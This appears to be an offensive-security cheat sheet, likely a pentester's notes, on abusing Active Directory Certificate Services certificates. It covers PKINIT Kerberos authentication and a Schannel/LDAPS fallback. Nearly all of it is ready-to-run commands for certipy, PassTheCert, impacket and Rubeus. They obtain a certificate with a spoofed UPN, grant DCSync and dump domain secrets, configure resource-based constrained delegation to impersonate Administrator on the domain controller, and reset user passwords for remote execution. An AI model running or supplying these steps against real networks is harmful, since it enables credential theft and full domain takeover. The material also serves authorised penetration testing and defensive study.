# PKINIT-Kerberos Cert Auth & Schannel (Fallback)

## Theory

> [!Overview] Title
> **PKINIT** extends Kerberos to allow **certificate-based initial authentication**: a client presents an **ADCS-issued X.509 client cert** to the KDC to obtain a TGT using public-key crypto. This requires proper DC/KDC certificates (e.g., including Smart Card Logon/KDC EKUs). If PKINIT isn't available or fails (e.g., KDC lacks the right cert), **Schannel (TLS/SSL)** can still authenticate to **LDAPS** using a client cert. Tools like **PassTheCert** leverage Schannel/LDAPS for LDAP-bound privilege changes (grant DCSync, RBCD, add computer, reset password) when PKINIT doesn't work.

## Requirements

- A usable **client certificate** (often obtained via ADCS: ESC1/ESC8/ESC11/etc.).
- **PKINIT path** prerequisites:

  - KDC/Domain Controller has a valid certificate (Smart Card Logon/KDC Authentication EKU).
  - CA trusts/chain installed on clients.
- **Schannel/LDAPS path** prerequisites:

  - LDAPS reachable on the DC (TCP **636**), DC trusts the issuing CA, and the account's certificate chains correctly.
- Tooling: `certipy`, `openssl`, `impacket` (`secretsdump.py`, `getST.py`, `wmiexec.py`), **PassTheCert** (Linux & Windows), `PowerView`/`powerview.py`, `Rubeus`.

## Linux

### Enumerate CA / Templates

```bash
certipy find -u '<USER>' -p '<PASS>' -dc-ip <DC_IP> -stdout -vulnerable
# Note CA: <CA_NAME>, DNS: <CA_FQDN>, template settings, ESC exposures
```

### Path A — PKINIT (if supported)

#### 1) Obtain a certificate (example: ESC1 machine-enrollment with UPN override)

```bash
addcomputer.py '<DOMAIN>/<USER>':'<PASS>' -method LDAPS -computer-name '<MACHINE>$' -computer-pass '<MACHINE_PASS>' -dc-ip <DC_IP>
# create a new machine account
```

```bash
# Example: enroll using a machine account against a user-misconfigured template
certipy req -u '<MACHINE>$' -p '<MACHINE_PASS>' -ca '<CA_NAME>' -dc-ip <DC_IP> \
  -template '<TEMPLATE_NAME>' -upn '<UPN>'
# Expect: "Got certificate with UPN '<UPN>'"; a <PFX_FILE> is produced
```

#### 2) Try PKINIT authentication

```bash
certipy auth -pfx '<PFX_FILE>'
# If successful: writes <CCACHE_FILE> and may print NT hash
# If you see KDC_ERR_PADATA_TYPE_NOSUPP => PKINIT not supported; use Schannel/LDAPS path
```

### Path B — Schannel/LDAPS (when PKINIT is NOT supported)

> Use [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) with your PFX. Extract key/cert from PFX (or use PFX directly on Windows).

#### 1) Extract cert & key from PFX (optional for Linux tooling)

```bash
# Private key (with passphrase prompt)
# leave import pass empty; add 7777 as pem pass
openssl pkcs12 -in <PFX_FILE> -nocerts -out <KEY_FILE>

# Public cert
openssl pkcs12 -in <PFX_FILE> -clcerts -nokeys -out <CRT_FILE>

# (Optional) remove passphrase
openssl rsa -in <KEY_FILE> -out <NOPASS_KEY_FILE>
```

#### 2) PassTheCert actions over **LDAPS (636)**

**Grant DCSync to a user**

```bash
python3 passthecert.py -dc-ip <DC_IP> -domain <DOMAIN> -port 636 \
  -crt <CRT_FILE> -key <NOPASS_KEY_FILE> \
  -action modify_user -target <USER> -elevate
# Then DCSync:
secretsdump.py '<DOMAIN>/<USER>':'<PASS>'@<DC_IP>
```

**RBCD: add computer + write RBCD to DC**

```bash
# Add a computer that we control
python3 passthecert.py -dc-ip <DC_IP> -domain <DOMAIN> -port 636 \
  -crt <CRT_FILE> -key <NOPASS_KEY_FILE> \
  -action add_computer -computer-name '<NEW_MACHINE>$' -computer-pass '<NEW_MACHINE_PASS>'

# Delegate to DC from our new computer
python3 passthecert.py -dc-ip <DC_IP> -domain <DOMAIN> -port 636 \
  -crt <CRT_FILE> -key <NOPASS_KEY_FILE> \
  -action write_rbcd -delegate-to '<DC_HOSTNAME>$' -delegate-from '<NEW_MACHINE>$'

# Impersonate Administrator for a service on the DC (time sync may be required)
getST.py -spn 'cifs/<DC_FQDN>' -impersonate Administrator \
  '<DOMAIN>/<NEW_MACHINE>$:<NEW_MACHINE_PASS>'
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass <DC_FQDN>
```

**Reset a user’s password**

```bash
python3 passthecert.py -dc-ip <DC_IP> -domain <DOMAIN> -port 636 \
  -crt <CRT_FILE> -key <NOPASS_KEY_FILE> \
  -action modify_user -target <USER> -new-pass '<NEW_PASS>'
# Then:
wmiexec.py <DOMAIN>/<USER>:'<NEW_PASS>'@<DC_IP>
```

> If Kerberos fails with clock skew (e.g., `KRB_AP_ERR_SKEW`), sync time: `sudo ntpdate <DC_IP>`.

---

## Windows

> On Windows, **PassTheCert.exe** can use the **PFX directly**; you’ll often need **distinguished names** and **SIDs** for targets.

### Gather LDAP metadata with PowerView

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -Identity '<USER>' | Select distinguishedname,objectsid
Get-DomainComputer -Identity '<DC_HOSTNAME>' -Properties distinguishedname
```

### Grant DCSync rights (Windows)

```powershell
.\PassTheCert.exe --server <DC_HOSTNAME> --cert-path .\<PFX_FILE> \
  --elevate --target "<TARGET_DN>" --sid <TARGET_SID>
# PassTheCert saves old nTSecurityDescriptor for easy restore
```

### RBCD (Windows)

```powershell
# Create a computer (password auto-generated if omitted)
.\PassTheCert.exe --server <DC_HOSTNAME> --cert-path .\<PFX_FILE> \
  --add-computer --computer-name <NEW_MACHINE>

# Get its SID
Get-DomainComputer -Name <NEW_MACHINE> -Properties objectsid

# Get DC DN
Get-DomainComputer -Name <DC_HOSTNAME> -Properties distinguishedname

# Write RBCD on the DC, allowing our machine to delegate
.\PassTheCert.exe --server <DC_HOSTNAME> --cert-path .\<PFX_FILE> \
  --rbcd --target "<TARGET_DN>" --sid <TARGET_SID>

# Abuse via Rubeus (example)
.\Rubeus.exe asktgt /user:"<NEW_MACHINE>$" /password:"<NEW_MACHINE_PASS>" \
  /domain:<DOMAIN> /impersonate:Administrator /msdsspn:CIFS/<DC_FQDN> /ptt
```

### Reset a user password (Windows)

```powershell
# Need target’s DN
Get-DomainUser -Identity '<USER>' -Properties distinguishedname

.\PassTheCert.exe --server <DC_HOSTNAME> --cert-path .\<PFX_FILE> \
  --reset-password --target "<TARGET_DN>" --new-password "<NEW_PASS>"
```

---

## Notes & Troubleshooting

* **PKINIT error** `KDC_ERR_PADATA_TYPE_NOSUPP`: KDC lacks a suitable DC certificate (e.g., Smart Card Logon). Fallback to **Schannel/LDAPS** approach.
* Ensure **LDAPS (636)** is accessible and the CA chain is trusted by the DC.
* **Clock skew**: Kerberos requires tight time sync. Use `ntpdate <DC_IP>`; `sudo rdate -n <DC_IP>` (Linux) or `w32tm /resync` (Windows).
* For ESC1-style enrollments, ensure template allows **Client Authentication** and **EnrolleeSuppliesSubject**, and you have enrollment rights (e.g., Domain Computers).
* PassTheCert (Linux) supports: `add_computer`, `del_computer`, `modify_computer`, `read_rbcd`, `write_rbcd`, `remove_rbcd`, `flush_rbcd`, `modify_user`, `whoami`, `ldap-shell`. Use restore flags/files on Windows to revert changes.
